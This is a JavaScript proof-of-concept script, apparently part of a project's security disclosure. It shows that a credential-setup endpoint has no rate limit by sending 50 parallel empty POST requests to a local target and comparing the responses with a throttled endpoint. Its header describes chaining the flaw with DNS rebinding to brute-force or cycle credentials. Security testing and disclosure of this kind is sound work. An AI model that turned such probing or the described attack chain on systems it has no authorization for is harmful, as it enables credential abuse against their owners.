/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  POC #3 — Key-Setup Endpoint Missing Rate Limit                ║
 * ║                                                                ║
 * ║  VULNERABILITY: server/standalone/key-setup.js L256            ║
 * ║  The POST /api/setup/keys endpoint has NO rate limiter.        ║
 * ║  Every other sensitive endpoint uses makeRateLimiter(), but    ║
 * ║  the credential management endpoint — the most sensitive       ║
 * ║  surface in the entire application — has zero throttling.      ║
 * ║                                                                ║
 * ║  Combined with DNS Rebinding (POC #1), this allows rapid      ║
 * ║  automated credential manipulation from a malicious website.   ║
 * ║                                                                ║
 * ║  IMPACT: High — Credential brute-force, rapid key cycling,    ║
 * ║  and automated .env manipulation without any throttle.         ║
 * ║                                                                ║
 * ║  HOW TO REPRODUCE: node security/poc/03-keyset-no-ratelimit.mjs║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

const TARGET = process.env.TARGET || 'http://localhost:4173';
const REQUESTS = 50;

async function exploit() {
  console.log('=== POC #3: Key-Setup Missing Rate Limit ===\n');
  console.log(`Sending ${REQUESTS} rapid requests to /api/setup/keys...\n`);

  // Compare: other endpoints like /api/military-installations use:
  //   if (!_militaryInstallationsRateLimiter(clientKey(req))) { 429 }
  // But /api/setup/keys has NO such check.

  let succeeded = 0;
  let rateLimited = 0;
  let rejected = 0;
  const start = Date.now();

  // Fire all requests in parallel — a rate limiter would block most of these
  const promises = Array.from({ length: REQUESTS }, async (_, i) => {
    try {
      const res = await fetch(`${TARGET}/api/setup/keys`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({}), // Empty body — just testing rate limiting
      });
      if (res.status === 429) {
        rateLimited++;
        return '429';
      } else if (res.status === 400) {
        // Expected — empty body is invalid, but the request was PROCESSED
        // (not rate limited). This proves no throttle exists.
        succeeded++;
        return '400-processed';
      } else {
        rejected++;
        return `${res.status}`;
      }
    } catch (e) {
      rejected++;
      return 'error';
    }
  });

  const results = await Promise.all(promises);
  const elapsed = Date.now() - start;

  console.log(`Results in ${elapsed}ms:`);
  console.log(`  Processed (no throttle): ${succeeded}`);
  console.log(`  Rate limited (429):      ${rateLimited}`);
  console.log(`  Other rejections:        ${rejected}`);
  console.log(`\n  Request rate: ${(REQUESTS / (elapsed / 1000)).toFixed(1)} req/sec`);

  if (rateLimited === 0 && succeeded > 0) {
    console.log('\n✓ VULNERABLE: Zero rate limiting on credential endpoint');
    console.log('  All requests were processed without any throttle.');
    console.log('  Compare with other endpoints that return 429 after ~60-90 req/min.');
    console.log('\n  Other endpoints with rate limiters:');
    console.log('    - /api/military-installations: 90 req/min + 300 global');
    console.log('    - /api/route:                  60 req/min + 200 global');
    console.log('    - /api/realtime/log:           120 req/min + 400 global');
    console.log('    - /api/setup/keys:             ∞ UNLIMITED ← VULNERABLE');
  } else if (rateLimited > 0) {
    console.log('\n✗ PATCHED: Rate limiting is in place.');
  }

  // Demonstrate the contrast with a rate-limited endpoint
  console.log('\n--- Control test: rate-limited endpoint ---');
  let controlProcessed = 0;
  let controlLimited = 0;
  const controlPromises = Array.from({ length: REQUESTS }, async () => {
    try {
      const res = await fetch(`${TARGET}/api/setup/status`);
      if (res.status === 429) controlLimited++;
      else controlProcessed++;
    } catch { controlProcessed++; }
  });
  await Promise.all(controlPromises);
  console.log(`  /api/setup/status: ${controlProcessed} processed, ${controlLimited} rate-limited`);
}

exploit().catch(console.error);
